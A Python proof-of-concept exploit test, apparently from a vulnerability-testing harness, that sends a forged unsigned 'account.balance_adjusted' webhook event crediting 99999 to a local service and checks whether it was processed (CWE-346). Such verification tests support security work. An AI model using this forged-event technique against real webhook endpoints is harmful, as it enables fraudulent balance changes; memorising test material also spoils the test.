"""PoC: Webhook event trust without re-fetch (CWE-346)."""
import uuid
from mosaic.oracle.exploit import ExploitTest


class EventTrustExploit(ExploitTest):
    """Webhook event trust: forged events processed without verification."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "hasura_webhook_event_trust"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []
        marker = f"forged_{uuid.uuid4().hex[:8]}"

        forged = {
            "type": "account.balance_adjusted",
            "data": {
                "id": marker,
                "status": "completed",
                "amount": 99999,
                "adjustment": "credit",
            },
        }

        resp = self.http_post("/v1/webhook", json=forged)
        evidence.append(f"Webhook POST: {resp.status_code}")

        if resp.status_code >= 400:
            evidence.append("Webhook rejected unsigned event")
            return False, "Not vulnerable - unsigned events rejected. " + " | ".join(evidence)

        # Check if event was processed
        resp = self.http_get("/v1/webhook/events")
        if resp.ok:
            try:
                events = resp.json().get("events", [])
                for e in events:
                    eid = ""
                    if isinstance(e, dict):
                        d = e.get("data", {})
                        eid = d.get("id", "") if isinstance(d, dict) else ""
                    if marker in str(eid):
                        evidence.append("Forged event found in processed events!")
                        return True, (
                            "CWE-346 Origin validation error confirmed. "
                            "Forged webhook event accepted without signature verification "
                            "and processed with trusted payload data. " + " | ".join(evidence)
                        )
            except Exception as ex:
                evidence.append(f"Parse error: {ex}")

        evidence.append("Event not found in processed events list")
        return False, "Could not confirm vulnerability. " + " | ".join(evidence)
